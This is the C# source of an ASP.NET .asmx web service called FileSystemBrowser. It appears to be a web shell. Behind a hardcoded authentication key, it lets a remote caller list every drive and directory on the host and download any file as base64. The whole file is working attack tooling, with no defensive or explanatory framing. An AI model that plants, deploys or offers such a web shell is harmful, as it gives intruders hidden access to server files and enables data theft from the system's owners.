<%@ WebService Language="C#" Class="FileSystemBrowser" %>
using System;
using System.Web.Services;
using System.IO;
using System.Text;

[WebService(Namespace = "http://tempuri.org/")]
public class FileSystemBrowser : WebService
{
    private const string AUTHKEY = "woanware";
    private const string HEADER = "<html>\n<head>\n<title>filesystembrowser</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";

    [WebMethod(Description = "Directory listing or file download")]
    public string HandleOp(string authkey, string operation, string directory, string file)
    {
        if (authkey != AUTHKEY) return "Invalid authkey";
        string output = HEADER;
        try
        {
            switch ((operation ?? "").ToLower())
            {
                case "download":
                    output += DownloadFile(file);
                    break;
                case "list":
                    output += OutputList(directory, authkey);
                    break;
                default:
                    output += OutputList(directory, authkey);
                    break;
            }
        }
        catch (Exception ex)
        {
            output += ex.Message;
        }
        output += FOOTER;
        return output;
    }

    private string DownloadFile(string file)
    {
        if (string.IsNullOrEmpty(file)) return "No file supplied";
        if (!File.Exists(file)) return "File does not exist";
        // File contents as base64 to embed in HTML (binary-safe)
        byte[] bytes = File.ReadAllBytes(file);
        string fileName = Path.GetFileName(file);
        string base64 = Convert.ToBase64String(bytes);
        return 
            $"<b>File: {fileName}</b><br/>" +
            $"<a download=\"{fileName}\" href=\"data:application/octet-stream;base64,{base64}\">Download</a><br/>" +
            $"<small>Size: {bytes.Length} bytes</small>";
    }

    private string OutputList(string dir, string authkey)
    {
        StringBuilder response = new StringBuilder();
        if (string.IsNullOrEmpty(dir))
        {
            string[] drives = Environment.GetLogicalDrives();
            foreach (string drive in drives)
            {
                response.Append($"<a href='?operation=list&directory={drive}&authkey={authkey}'>Drive: {drive}</a><br/>");
            }
            return response.ToString();
        }
        if (!Directory.Exists(dir)) return "Directory does not exist";
        DirectoryInfo di = new DirectoryInfo(dir);

        response.Append($"<b>Directory: {dir}</b><br/>");
        if (di.Parent != null)
            response.Append($"<a href='?operation=list&directory={di.Parent.FullName}&authkey={authkey}'>.. (parent)</a><br/>");
        // Directories
        foreach (var d in di.GetDirectories())
        {
            response.Append($"<b>dir</b> <a href='?operation=list&directory={d.FullName}&authkey={authkey}'>{d.Name}</a><br/>");
        }
        // Files
        foreach (var f in di.GetFiles())
        {
            response.Append($"file <a href='?operation=download&file={f.FullName}&authkey={authkey}'>{f.Name}</a> ({f.Length} bytes)<br/>");
        }
        return response.ToString();
    }
}
